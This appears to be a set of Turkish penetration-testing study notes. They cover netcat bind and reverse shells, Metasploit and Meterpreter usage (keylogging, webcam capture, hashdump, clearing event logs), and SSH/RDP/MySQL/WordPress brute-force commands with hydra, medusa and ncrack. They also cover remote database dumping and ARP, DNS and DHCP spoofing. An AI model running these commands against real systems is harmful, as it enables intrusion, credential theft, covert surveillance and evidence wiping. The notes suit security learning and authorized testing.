#############################################################
-REMOTE SHELL KAVRAMI VE TÜRLERİ:
> remote shell, hedef sistemin işletim sistemi kabugunda uzaktan bağlantı erişimi ve kullanım yetkisi 
  elde etme durumuna verilen addır, gerçekleşirse shell almak olarak ifade edilir 
  
> 2 tür remote shell bağlantısı vardır:
	> 1: Bind (düz) shell:
	  saldırgandan hedefe doğru yapılan bağlantı ile sağlanır 
	  hedef, bir ip ve port aracılıgıyla, listener "dinleyici" konumundadır 
	  - firewall tarafından engellenebilir olması nedeniyle pek tercih edilmez
	  
	> 2: Reverse (ters) shell:
	  hedeften saldırgana yaptırılan bağlantı ile sağlanmaktadır 
	  en çok tercih edilen shell türüdür 
	
###############################################################
-NETCAT İLE BİND SHELL ÖRNEĞİ:
> netcat parametreleri:,
	-l -> listener
	-v -> verbose 
	-p -> port 
	-e -> bağantıyı ilgili dosya ile açar 
	
> nc -lvp 1234 -> 1234 portunu dinlemeye başlar 
> nc ip port -> belirtilen ip ve porta bağlanmaya çalışır 
	> bu sadece bağlantı sağlar 
	
	
> nc -lvp 1234 -e cmd.exe -> bind shell verir 

-NETCAT İLE REVERSE SHELL ÖRNEĞİ:

> nc -lvp 1234 -> kendi makinemizi dinleyeme alıyoruz 
> nc ip 1234 -e cmd.exe -> kurban makine kendi shellini bize açar 

######################################################################
-METASPLOİT KAVRAMLARI VE KOMUTLARI:
> scanning fazında nmap nekadar güçlü ise exploiting aşamasında msf okadar güçlüdür 
> metasploit hedef sistem için uzaktan çalıştırılabilir remote exploitler ve hedef sistemler içerisinde 
  çalıştırılabilir olan local exploitlerin yanı sıra diğer modulleride barındıran bir istismr 
  yönetim aracıdır 
  ruby dilinde yazılmış açık kaynak kodlu bir uygulamadır 
  
> AUXİLİARY: hedef sistem hakkında bilgi çıkartmak için kullanılan yardımcı moduller 

> PAYLOAD: istismar edilen sistemlerde, exploitlerden sonra çalışan (gönderilen) modullerdir 
  hedef sistemin ve exploitlerin türlerine bağlı olarak seçilirler 

> ENCODER: anti virüs ve firwall gibi güvenlik önlemlerini atlatmak için kullanılan modullerdir 

> NOP: Payload kodunun yürütülebilmesi için hedef sistemdeki işlemcinin döngüye sokulmasını 
  payload için güvenli bir ortam üretilmesini sağlar "No Operation un kısaltılmasıdır" 
  
> POST: exploit işlemi sonrası post-exploitation fzında kullanılabilecek modullerdir 
 
> metasploit komutları:
	- msfconsole -> metasploit i başlatır - msf run ile kullanmak verim arttırır  
	- msfdb run -> msf veritabanını başlatır 
	- msfdb init -> msf için veritabanını ayarlar (ilk kullanım için tek seferlik)
	- db_status -> msf db sinin durumunu kontrol eder 
	- search -> modul aramak için kullanılır 
	- info veya advanced -> modul hakkında bilgi verir 
	- show -> modul ve modul içerisindeki ayarların listesni verir 
	- use -> modulu kullanmak için 
	- options -> modulu ayarlamak için 
	- set -> bir ayarı ayarlamak için
	- check -> ilgili modul için hedefte ön kontrol gerçekleştirilir 
	- run veya exploit -> işlemi başlatır
	- sessions -> alınan shell ler arası geçiş sağlar
	- jobs -> arkaplanda çalışan modul işlemlerini gösterir 
	- back -> geri gider 
	- exit -> msf den çıkar   

-METASPLOİT VERİTABANI (DB) İLK AYARLAMALARI:
> not: msf postgresql e ihtiyaç duyr 
> ilk olarak "msfdb init" diyoruz 
> bu ayarlama tek seferliktir normal kullanımda sadece db yi bşlatmk yeterli olacaktır 
	> msfdb run demek yeterlidir bunun için
	
-METASPLOİT'TE YARDIM ALIMI:
> help yazabilir veya ? kullnabiliriz 
> info modul_adı veya modul_numarası
> advanced tam_modul_adı 


-METASPLOİT'TE ARAMA (SEARCH) KULLANIMI:
> search ftp mesela
> check kısmında ön kontrol yapabilme özelliği vs varmı onu yazar 
> rank:good -> iyi çalışan modulleri getirir 
> cve:2019 -> 2019 yılında çıkan açıkları getirir 
> type:auxiliary -> bu tiptekileri getirir 

-METASPLOİT'TE MODÜL KULLANIMI VE AYARLARI:
> use id veya tam_isim
> options -> ayarları gösterir 

-METASPLOİT'TE NMAP KULLANIMI:
> db_nmap -> bundan soransı nmap prametreleridir 
> nmap in donus gibi gorundugu zamanlarda "tshark" ile arkaplandaki trafiği izleyebiliriz 


########################################################################
-EXPLOİT SALDIRILARI:
#########################################################################
-NMAP VE METASPLOİT İLE MS17-010 AÇIĞI KONTROLÜ:
> ethernal-blue güvenlik açığıda denmektedir baya ünlüdür 
> ilk olarak standart şekilde nmap taramalarımızı yapalım script scan ile de olur 
> msfconsole ile ms17 aratalım ve kontrol destekli olan birini seçelim
> show target ile bakabiliriz 
> "check" yapalım gerekli noktaları doldurup 


-METERPRETER KOMUTLARI (METERPRETER CHEAT SHEET):
> meterpreter baya iyi bir payloaddır 
> komutları ve anlamları:
	NOT: "#" işareti yetki tükselme gereksinimi var demektir  
	- sysinfo -> sistem bilgisi 
	- show_mount -> bağlı diskler i"partion" ları gösterir 
	- idletime ve localtime -> sistemin boşta oldugu süreyi ve local zamanı görüntüler 
	# shutdow veya reboot -> sistemi kapatır veya yeniden başlatır - yetki yükseltme lazım
	- ipconfig -> sistem ip yapılandırmasını gösterir 
	- portfwd -> paket yönlendirmesi yapar 
	- route -> rotaların görüntülenmesini veya değiştirilmesini sağlar 
	- ps -> çalışan işlemleri gösterir 
	- kill pid_id -> ilgili işlemi sonlandırır 
	- getpid -> oturumun hangi pid ile çalıştıgını gösterir
	# migrate pid_id -> ilgili işlemi başka işlem ile maskeler - yetki yükseltme lazım
	- clearev -> olay gunlugunun temizlenmesini sağlar 
	- shell -> ilgili sistemin shell ine geçiş yapar 
	- edit dosya_file -> ilgili dosyayı düzenlemeyi sağlar 
	- execute -f dosya_file -> ilgili dosyanın çalıştırılmasını sağlar 
		-> -f -> dosya -H -> gizle -i -> çalıştır ve çağır 
	- search -f dosya_adı -> ilgili dosyayo arar 
	- upload neyi_ nereye_ 
	- download neyi_ nereye_ 
	- bg veya background -> meterpreter oturumunu msf nin arkaplanına atar 
	- sessions -i id_numarası -> ilgili sessiona a geçiş sağlar 
	- bgrun - bglist -bgkill -> arkaplandaki msf işlemleri içindir 
	- getuid -> bağlı oturumun yetki sınıfını görüntüler 
	- getprivs -> bağlı oturumda yetkilendirilmiş işlemleri görüntüler 
	- getsystem -t 0 -> bağlı kullanıcının sistem kullanıcı yetkilerine yükseltilmesini dener 
	- reg komut_ -> hedef sistemin registery sini yönetir "reg -h" ile yardım alınabilir 
	# hashdump -> sistem üzerindeki şifre hashlerini görüntüler 
	# webcam_list -> sistem üzerindeki webcam leri listeler 
	# webcam_snap -> hedefteki webcam görüntüsü alır 
	# screenshot -> hedefin ekran görüntüsünü alır "espia eklentisinin çalışması lazım ama" 
	- keyscan_start ve keyscan_stop -> keylogger çalıştırır ve durur "migrate gerektirir"  
	- keyscan_dump ->   keyscan_stop demeden çalıştırma gereklidir kayıtları sisteme çeker 
	- irb -> msf scriptlerini oluşturup çalıştırabilceğimiz ortam açar 
	- run script_adı -> ilgili scripti çalıştırır 
	- load eklenti_ -> msf eklentisi ekler "load -l ile listelenebilir" 


-METERPRETER İLE HEDEFTE SİSTEM KEŞFİ:
> exploit i kullandıktan sonra session açıldıktan sonra 
- boş

-METERPRETER İLE HEDEFTE DOSYA DİZİN YÖNETİMİ:
- boş

-EXPLOİT ARAŞTIRMASI (SPESİFİK HEDEF İÇİN):
> insanla etkileşime geçmeyen web servisleri direk url olrak girmicektir 
> bu nedenle görüntülenebilir sayfası farklı olabilir bunu araştırmamız gerek 
> şimdi bunun için exploit araması yapabiliriz CVE numarası versiyon bilgisi ile araştıma yapalım
> eğer bulursak bunları kullanalım 

> eğer versiyon bilgisi bulunamadı ise portun üstüne gidebiliriz tüm portları taramak yerine 
  sadece ilgili portu tarayabiliriz 
  
> saldırılar için bildiklerimizi birleştirmemiz gerek 
> mesela nmap sadece vuln taraması değil bilgi için enum taramasıda yapabilmektedir 

###############################################################################################
-EXPLOİT VERİTABANLARI VE KAYNAKLARI:
> çok güzel bir kaynaktır 

> bu sitedeki 
  EDB VERİFİED -> exploitin exploit database tarafından doğrulanıp doğrulanmadını gösterir 

> packetstorm da bu işlemler için bir web sitesidie 
  cxsecyurity.com
  vulners.com
  sploitus.com
  vulnerability-lab.com
  0day.today -> baya güçlüdür exploit alım satımı bile vardır 
  
###########################################################################################
-SEARCHSPLOİT İLE EXPLOİT-DB KULLANIMI:
> searchsploit -u -> update eder 
> searchsploit aranacak_ifade 
> -w -> exploit db linkini verir 
> -t title içinde geçenleri arar
> -e kesin ifade arar 
> --id -> exploit db id si verir 
> -p -> ğath ini verir 
> -v -> verbose verir 
> -x -> ilgili exploiti vim ile açar 
> -m -> bulundugumuz dizine kopyalar 

################################################################################################
-MANUEL EXPLOİT İLE SALDIRI: 
> exploitin gereksinimleri ilk satırlrda verilir genelde 
> exploiti kendi dizinimize alalım
> kodu gereksinimine göre çalıştırmak için ayarlayalım kütüphaneleri indirelim 


################################################################################################
-BRUTE FORCE VE EXPLOİT SALDIRILRI
################################################################################################
-DİCTİONARY ATTACK VE WORDLİST'LER HK:
> sadece şifre veya kullanıcı adı olarak değilde her konuda kullanılan tehlikeli ve güçlü saldırı tipleridir 
> 15 yıllık tecrübe ile doğrulanıyor 
> bir şifreyi bu devider en az 3 kişi biliyor siz, veritabanı, veritbanı yöneticisi 
> nord vpn nin bu işlemlerde istatistikleri vardır 
> SecList çok etkili bir kaynaktır kali içerisinde ön tanımlı gelmektedir 
  rockyou.txt -> kalide ön tanımlıdır 
  Probable-Wordlists -> çok büyük wordlistler bulundurmaktadır ama iyidir 
  turkce-wordlist 
  wordlists
  g0tmi1k.com -> buradada pek çok yüksek boyutlu wordlist bulunmaktadır 
  
  
-LOKAL WORDLİSTLER:
> kalideki local olanlar /usr/share/wordlist altında bulunmaktadır 
> not wordlistleri düz metin editoru ile açmak intihar olur "geany" gibi gelişmiş editorler ile ancak açılabilirler 

########################################################################################################
-NMAP İLE DİCTİONARY ATTACK (SSH):
> nmap --script ssh-brute --script-args userdb=username.txt,passdb=passwords.txt ip_adresi -p port_nosu

-METASPLOİT İLE DİCTİONARY ATTACK (SSH):
> use auxiliary/scanner/ssh/shh_login
> set rhosts file:ip_list.txt
> set userfile usernames.txt
> set passfile pass.txt
> set verbose true 
> run

> msf bu işlemler için pek uygun değildir yavatır 
  ve hatalarla baş edemeyebilir 

#########################################################################################
-MEDUSA İLE DİCTİONARY ATTACK (SSH):
> bu işlemlerde en çok kullnılan araçlardan biridir 
> medusa -U user_list.txt -P password_list.txt -H host_list.txt -M ssh -n port_numbees -f 
											|-> başarılı olursa durur 

-NCRACK İLE DİCTİONARY ATTACK (SSH):
> ncrack bu işlemlerde ciddi manada hızlıdır 
> ncrack -U username_list.txt -P pass_list.txt -iL host_list.txt -m ssh -p port_numbers -d -f 
  											 |-> d debug -f de medusa gibi bulunca dur demek

-HYDRA İLE DİCTİONARY ATTACK (SSH) -kullanıcı dostudur sevilir-:
> çoklu hedefleri pek sevmez
> hydra -L users.txt -P passwords_lst.txt ssh -v -d -f -> verbose debug ve bulunca dur demektir 
					  ssh://ip_adresi:port_no
-V -> denemeleri göster demektir 
-t -> thereads demektir 
-I -> check point dosyasını görmezden gelir 
-o dosya.txt -> eşleşen pass leri yazar 


############################################################################################
-SSH KOMUTLARI VE KULLANIMI:
> cmd diyerek windows shell e geçelim mesela makine windows ise 
> reg export HKLM c:/hklm.reg /y -> registery yedeği alır 
> ssh user@host komut_adı -> buradaki komut_adı 

> shutdown komutu mesela 
	-f -> force - zorla yani
	-r -> restart 
	-t -> timeout - 5 saniye sonra
	  
> fsutil file createnew dosya_adı dosya_boyutu
> scp komutu ile ssh ile yani dosya upload ve downloadı yapılbilir 

> ssh -Q kex -> bize kex tiplerimizi gösterir 
> ssh -o KexAlgorithims=algoritma_adı 
      -c chiper ekleyebiliriz 
      
#####################################################################################################
-RDP'YE DİCTİONARY ATTACK VE RDESKTOP:
> hydra -L users.txt -P passwords.txt rdp://ip_adresi -f -vV -t 1	
								|-> t zaman yarıdır 1 yvaştır yukarı dogru artar
								rdp de yavaş iyidir 
							
>not-> -z -f -> z bağlantıyı sıkıştırır -f ise fullscreen demektir çıkmaki için logoff lazımdır f de 


-MYSQL'E DİCTİONARY ATTACK VE NULL PASSWORD:
> hydra -L users.txt -P passs.txt ip_addrs mysql -vV -f 
> ama null password denemek için "-e n" kullanmamız gerek 


########################################################################################################
-MYSQL KOMUTLARI, KULLANIMI VE DBDUMP:
> mysql -u username -p passowrd -h hostname -P port 

> show databases; -> veritbanlarını gösterir 
> use database_name; -> veritabanını kullanmamızı sağlar 
> show tables; -> veritabanındaki tabloları gösterir 
> desc tablo_ado -> tablo yapısını sorar sisteme 
> select user_login from user; -> bu sutuna denk gelen satır değerlerini getirir 
> select user_login,user_pass from user; -> 2 sutunu getirir 
> select * from user; -> user tablosunun tamamını getirir 

>> veritabanı yapıları:
> satır ve sütünlar tablolar içerisindedir 

> veritabanını uzaktan kullanma 
> mysqlshow komutunu kullanacapız 
> mysqlshow -h host_ip --user username --pass password -> gider ve bize db leri getirir 
> --count -> tablolar hakkında bilgi getirir 

> mysql -h host_ip -u root database_name -e `komutumuz`
	> -e execute demektir 

> mysqldump -h host_ip database_name > /home/yser/dbdump.sql -> database dump ı alır  

########################################################################################################
-HASH CRACKİNG:
> kali içerisinde hash-idenfer bulunur hash leri yapıştırınca olası hash tiplerini bize verir 
> ilk 3 karakter hash kimliği verecektir 
> kriptolojide saymak 0 dan başlar 

> hash cracking işlemi için hashcat çok sevilen bir programdır 
	> -m -> hash tipi
	> -a -> atak modu 
	> --status -> bilgi verir 
	> --show -> önceden kırılan hash varsa gösterir 

################################################################################################
-WORDPRESS LOGİN'E DİCTİONARY ATTACK:
> msf bu konuda iyidir 
> use auxiliary/scanner/http/wordpress_login_enum bunu kullanacağız 
	> set rhosts ip_adresi
	> set rport port_nosu
	> set targeturi https://domain.com/wordpress/
	> set user_file usernames.txt
	> set pass_file passwords.txt 
	> set verbose true 
	> run

-MANAGEENGİNE LOGİN'E DİCTİONARY ATTACK:
> gene msf kullanacağız 
> use auxiliary/scanner/http/manageengine_desktop_central_login
	> rport ve rhost u verelim
	> wordlistlerimizi verelim
	> verbose alalım 
	> ve run diyelim 

NOT: mesela smb bf yapıp kullanıcı adı ve şifre bulundu smb/psexxec modulu ile bu istismar edilebilir 
	secrets_dump var mesela 
NOT: Windowsda sam vardır - security account manager 
	LM NTLM hash lerini tutar SAM adli registery dosyasınd tutulur 
	RID var mesela kullanıcı yetkilerini belirler hash içerisinde bulunur 
	

########################################################################################################
-MAN-IN-THE-MIDLE SALDIRILARI:
########################################################################################################
-ORTADAKİ ADAM (MAN-İN-THE-MİDDLE) KAVRAMI:
> ortadaki adam terimi, networkdeki standart iletişim yöntemlerinin ve süreçlerinin manipüle edilmesi 
  anlamındadır. birden fazla manipülasyon çeşidi ve amacı vardır 
  
 istemci ------------------------------------------------------> hedef 
 
 
 İstemci       tafik		kötü niyetli 	   trafik	    hedef
 client  -------------------->     kişi      ---------------------> server 
  
> bu işlemi yapan kişinin amacı
	> paketleri okumak
	> değiştirmek 
	> veya drop etmek olabilir 


-WİRESHARK KULLANIMI VE PAKET FİLTRELEME:
>  
> source -> kaynak
  destination -> hedef 
  protcol -> protokol 
  
> en altdaki hex verisi frame dir paketin tamamını temsil eder 
> orta kısım ise data ve segment kısımları bulunmaktadır 

> icmp -> ping paketi 
> dns and ip.addr==ip_adresi -> belirli ip den gelen dns sorgularını filtreler 
WIRESHARK FİLTRELEME KOMUTLARI:

IP Adresine Göre:
ip.addr==10.10.10.11

Hedef IP Adresine Göre:
ip.dst==10.10.10.11

Kaynak IP Adresine Göre:
ip.src==10.10.10.11

Çoklu IP Adresine Göre:
ip.addr==10.10.10.11 and ip.addr==10.10.10.12

IP Adresi Dışlamasıyla:
!(ip.addr==10.10.10.12)

TCP Portuna Göre:
tcp.port==80

Hedef TCP Portuna Göre:
tcp.dstport==80

IP Adresi ve TCP Portuna Göre:
ip.addr==10.10.10.11 and tcp.port==80

Hostname'e Göre:
ip.host==server05

MAC Adreslerine Göre:
eth.addr==00:70:f4:23:18:c4

Broadcast Paketlerini Filtreleme:
eth.dst==ff:ff:ff:ff:ff:ff

URL'e göre:
http.host=="www.google.com"
http.host contains "google"

HTTP Metoduna Göre:
http.request.method==GET 
http.request.method==POST
http.request.method==GET or http.request.method==POST

IP ve HTTP Metoduna Göre:
ip.addr==10.10.10.11 and http.request.method==GET or http.request.method==POST

IP ve Protokol'a Göre:
ip.addr==10.10.10.11 and icmp
________________________________________________________
--- ARAMA KISAYOLU ---
Ctrl + F >>> String

> tshark -i interface -f "filtreleme_prametresi" 

########################################################################################################
-PROMİSCUOUS MODE VE PACKET SNİFF KAVRAMLARI:
> PROMİSCUOUS MODE: ethernet kartı bu modu destekliyor ve swtich lerdeki mac kontrolu yoksa ağda paketleri dinleyebiliriz 

########################################################################################################
-ARP HAKKINDA ÖN BİLGİLENDİRME:
> arp yazrak arp table larına bakabiliriz ama çevredeki herkes yazmaz bu tabloolarda
  bu tablolarda bizle iletişime geçenler bulunur  
> güncelleme sıklıgı /proc/sys/net/ipv4/neight/default/gc_stable_time 

> arp-scan -l -> arp taraması yapabiliriz 
> ifconfig internet_kartı -arp -> arp ı kapatmış oluruz - koymadan yazrsak geri açar  
  bunu yaparsak ağ içi iletişim bozulur 

########################################################################################################
-ARP POİSONİNG (ARP ZEHİRLEME) SALDIRISI: 
> oncelikle arp-scan yapıyoruz 

> arpspoof -i interfce_adı 192.168.1.12 -> benim mac adresim bu ip ye bağlıdır diye yayın yapar 
> arpspoof -i wlan0 192.168.1.3 192.168.1.22 -> 1.3 ip adresine 1.22 ip adresi bana aittir yayını yapar 

> paketlerin üzerimizden yönlendirebilmek için
  echo 1 > /proc/sys/net/ipv4/ip_forward şeklinde yazıyoruz 
  
  
> sadece tek tarafı zehirlemek yetmez 2 cihazıda arp zehirlemesi yapılmalıdır 
> arpspoof -t wlan0 -t zehirlenecek_ip -r sahte_ip_adresimiz 
  buradaki zehirlenecek_ip hedef cihazımız sahte_ip_adresimiz ise yerine geçtimiz cihaz -t target demek
  -r ise reverse demektir 2 cihazıda zehirlememizi sağlar 
  
-HTTP PACKET SNİFFİNG:
  > etrafı keşfediyoruz 
  > sniffer - wireshark açalım
  > ip yönlendirmesi yapalım 
  > MITM yapalım - çift taraflı arp zehirlenmesi 
  > sniff edelim
  
  
-DNS SPOOFİNG SALDIRISI:  
> bilgisayarlar isimlernden anlamadıgı çin isimleri ip adreslerine çevirirler bu nedenle bu işlemi yapan
  dns dir bunun zehirlenmesini yapacağız 

> bu işlem için gui araç oln ettercap mevcuttur arp scan yptıktan sonra hedeflerimiz seçebiliriz bu 
  tool üzerinden 
  > arp poising yapalım hemen ilk olarak ettercap olarak 
  > ettercap içerisinde ayarlarında plugins vardır oraya girerek dns spoof a 2 kez tıklayalım
    dns spoof dosyası vrdır ettercap in /etc/ettercap/etter.dns 
    bu dosaynın en alt kısmına inerek hangi domain için hangi ip adresine yönlendirme ypılacak
    yazabiliriz mesela:
    www.google.com A 192.168.1.1 -> mesela
    
-DHCP SPOOFİNG (ROGUE SERVER) SALDIRISI:
> ettercap üzerinden dhcp spoof kısmın gelelim

-DHCP STARVATİON SALDIRISI:
> DHCP DOS saldırısıdır 
> yersinia aracımızı kullanacağız bu işlem için 
  


